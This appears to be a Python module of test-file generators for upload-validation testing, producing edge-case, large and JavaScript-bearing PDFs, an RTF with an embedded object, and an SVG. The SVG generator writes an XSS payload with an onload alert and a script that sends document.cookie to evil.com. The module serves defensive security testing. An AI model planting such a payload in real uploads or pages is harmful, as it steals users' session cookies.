"""Document file generators for testing upload validation."""

import struct
from pathlib import Path
from typing import Optional

from .base import BaseGenerator, GeneratedFile


class EdgeCasePDF(BaseGenerator):
    """Generate PDF with edge case properties."""
    
    @property
    def name(self) -> str:
        return "edgecase_pdf"
    
    @property
    def description(self) -> str:
        return "PDF with unusual structure/headers"
    
    @property
    def file_type(self) -> str:
        return "pdf"
    
    @property
    def mime_type(self) -> str:
        return "application/pdf"
    
    @property
    def category(self) -> str:
        return "document"
    
    def generate(self) -> GeneratedFile:
        """Generate edge case PDF."""
        filename = "edgecase.pdf"
        filepath = self.output_dir / filename
        
        pdf_content = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(Test Document) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000214 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
307
%%EOF
"""
        
        with open(filepath, "wb") as f:
            f.write(pdf_content)
        
        self._temp_files.append(filepath)
        
        return GeneratedFile(
            name=filename,
            path=filepath,
            file_type=self.file_type,
            mime_type=self.mime_type,
            size=filepath.stat().st_size,
            description=self.description,
            category=self.category,
            metadata={"pdf_version": "1.4", "pages": 1},
        )


class MalformedSVG(BaseGenerator):
    """Generate SVG with potential security issues."""
    
    @property
    def name(self) -> str:
        return "malformed_svg"
    
    @property
    def description(self) -> str:
        return "SVG with embedded script and unusual elements"
    
    @property
    def file_type(self) -> str:
        return "svg"
    
    @property
    def mime_type(self) -> str:
        return "image/svg+xml"
    
    @property
    def category(self) -> str:
        return "document"
    
    def generate(self) -> GeneratedFile:
        """Generate SVG with potential XSS."""
        filename = "malicious.svg"
        filepath = self.output_dir / filename
        
        svg_content = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
    <script>document.location='http://evil.com?c='+document.cookie</script>
    <circle cx="100" cy="100" r="50" fill="red"/>
    <foreignObject>
        <body xmlns="http://www.w3.org/1999/xhtml">
            <script>alert('XSS via foreignObject')</script>
        </body>
    </foreignObject>
</svg>
"""
        
        with open(filepath, "wb") as f:
            f.write(svg_content)
        
        self._temp_files.append(filepath)
        
        return GeneratedFile(
            name=filename,
            path=filepath,
            file_type=self.file_type,
            mime_type=self.mime_type,
            size=filepath.stat().st_size,
            description=self.description,
            category=self.category,
            metadata={"has_script": True, "has_onload": True, "has_foreignObject": True},
        )


class LargePDF(BaseGenerator):
    """Generate a large PDF file."""
    
    def __init__(self, output_dir: Optional[Path] = None, num_pages: int = 1000, cleanup: bool = False):
        super().__init__(output_dir, cleanup=cleanup)
        self.num_pages = num_pages
    
    @property
    def name(self) -> str:
        return "large_pdf"
    
    @property
    def description(self) -> str:
        return f"Large PDF with {self.num_pages} pages"
    
    @property
    def file_type(self) -> str:
        return "pdf"
    
    @property
    def mime_type(self) -> str:
        return "application/pdf"
    
    @property
    def category(self) -> str:
        return "document"
    
    def generate(self) -> GeneratedFile:
        """Generate large PDF."""
        filename = f"large_{self.num_pages}_pages.pdf"
        filepath = self.output_dir / filename
        
        pdf_header = b"%PDF-1.4\n"
        
        objects = []
        obj_count = 0
        
        obj_count += 1
        objects.append(f"{obj_count} 0 obj\n<< /Type /Catalog /Pages {obj_count + 1} 0 R >>\nendobj")
        
        obj_count += 1
        objects.append(f"{obj_count} 0 obj\n<< /Type /Pages /Kids [{obj_count + 1} 0 R] /Count {self.num_pages} >>\nendobj")
        
        for i in range(self.num_pages):
            obj_count += 1
            page_content = f"""%% Page {i + 1}
BT
/F1 12 Tf
100 {750 - (i % 50) * 10} Td
(Page {i + 1} content) Tj
ET"""
            page_stream = page_content.encode()
            objects.append(
                f"{obj_count} 0 obj\n<< /Type /Page /Parent {obj_count - 1} 0 R "
                f"/MediaBox [0 0 612 792] /Contents {obj_count + 1} 0 R >>\nendobj"
            )
            obj_count += 1
            objects.append(
                f"{obj_count} 0 obj\n<< /Length {len(page_stream)} >>\n"
                f"stream\n{page_content}\nendstream\nendobj"
            )
        
        xref_offset = len(pdf_header)
        for obj in objects:
            xref_offset += len(obj.encode()) + 1
        
        pdf_trailer = f"""xref
0 {obj_count + 1}
0000000000 65535 f 
"""
        for i in range(obj_count + 1):
            pdf_trailer += f"{i:010d} 00000 n \n"
        
        pdf_trailer += f"""trailer
<< /Size {obj_count + 1} /Root 1 0 R >>
startxref
{xref_offset}
%%EOF
"""
        
        with open(filepath, "wb") as f:
            f.write(pdf_header)
            for obj in objects:
                f.write(obj.encode())
                f.write(b"\n")
            f.write(pdf_trailer.encode())
        
        self._temp_files.append(filepath)
        
        return GeneratedFile(
            name=filename,
            path=filepath,
            file_type=self.file_type,
            mime_type=self.mime_type,
            size=filepath.stat().st_size,
            description=self.description,
            category=self.category,
            metadata={"num_pages": self.num_pages},
        )


class PDFWithJavaScript(BaseGenerator):
    """Generate PDF with embedded JavaScript."""
    
    @property
    def name(self) -> str:
        return "pdf_with_js"
    
    @property
    def description(self) -> str:
        return "PDF with embedded JavaScript action"
    
    @property
    def file_type(self) -> str:
        return "pdf"
    
    @property
    def mime_type(self) -> str:
        return "application/pdf"
    
    @property
    def category(self) -> str:
        return "document"
    
    def generate(self) -> GeneratedFile:
        """Generate PDF with JavaScript."""
        filename = "pdf_with_js.pdf"
        filepath = self.output_dir / filename
        
        js_content = """this.getField("malicious").value = "XSS"; app.alert("Hacked!");"""
        
        pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Names 2 0 R /Pages 3 0 R >>
endobj
2 0 obj
<< /Names << /JavaScript << /Names << /TestScript {4} 0 R >> >> >>
endobj
3 0 obj
<< /Type /Pages /Kids [5 0 R] /Count 1 >>
endobj
4 0 obj
<< /Type /JavaScript /S /JavaScript /JS ({js_content}) >>
endobj
5 0 obj
<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] /Contents 6 0 R /Annots [7 0 R] >>
endobj
6 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
100 700 Td
(Test Document) Tj
ET
endstream
endobj
7 0 obj
<< /Type /Annot /Subtype /Widget /FT /Tx /T (malicious) >>
endobj
xref
0 8
0000000000 65535 f 
0000000009 00000 n 
0000000072 00000 n 
0000000151 00000 n 
0000000241 00000 n 
0000000330 00000 n 
0000000419 00000 n 
0000000534 00000 n 
trailer
<< /Size 8 /Root 1 0 R >>
startxref
607
%%EOF
"""
        
        with open(filepath, "wb") as f:
            f.write(pdf_content.encode())
        
        self._temp_files.append(filepath)
        
        return GeneratedFile(
            name=filename,
            path=filepath,
            file_type=self.file_type,
            mime_type=self.mime_type,
            size=filepath.stat().st_size,
            description=self.description,
            category=self.category,
            metadata={"has_javascript": True, "has_embedded_script": True},
        )


class RTFWithEmbedded(BaseGenerator):
    """Generate RTF file with embedded content."""
    
    @property
    def name(self) -> str:
        return "rtf_embedded"
    
    @property
    def description(self) -> str:
        return "RTF file with embedded object"
    
    @property
    def file_type(self) -> str:
        return "rtf"
    
    @property
    def mime_type(self) -> str:
        return "application/rtf"
    
    @property
    def category(self) -> str:
        return "document"
    
    def generate(self) -> GeneratedFile:
        """Generate RTF with embedded content."""
        filename = "embedded.rtf"
        filepath = self.output_dir / filename
        
        rtf_content = r"""{\rtf1\ansi{\object\objemb{test.bin}}
{\fonttbl{\f0 Times New Roman;}}
\f0\fs24 Test Document
}"""
        
        with open(filepath, "wb") as f:
            f.write(rtf_content.encode())
        
        self._temp_files.append(filepath)
        
        return GeneratedFile(
            name=filename,
            path=filepath,
            file_type=self.file_type,
            mime_type=self.mime_type,
            size=filepath.stat().st_size,
            description=self.description,
            category=self.category,
            metadata={"has_embedded_object": True},
        )
